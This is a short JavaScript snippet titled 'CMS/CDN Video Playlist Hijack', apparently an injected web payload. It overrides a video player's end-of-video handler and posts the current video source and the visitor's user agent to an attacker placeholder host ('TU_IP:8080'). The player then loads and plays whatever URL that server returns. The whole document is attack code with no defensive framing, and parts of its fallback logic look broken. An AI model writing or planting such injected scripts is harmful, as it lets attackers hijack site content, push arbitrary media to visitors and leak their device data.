// CMS/CDN Video Playlist Hijack
(function() {
    const originalEnd = window.PlayerManager?.prototype?.onVideoEnd || 
                       window.HTMLMediaElement.prototype.onended;
    
    window.PlayerManager = window.PlayerManager || {};
    window.PlayerManager.prototype.onVideoEnd = async function() {
        try {
            const response = await fetch('http://TU_IP:8080/api/next-video', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({current: this.currentSrc, device: navigator.userAgent})
            });
            const {url} = await response.json();
            this.loadMedia(url);
            this.play();
            console.log('[+] CDN Next video:', url);
        } catch(e) {
            originalEnd?.call(this);
        }
    };
})();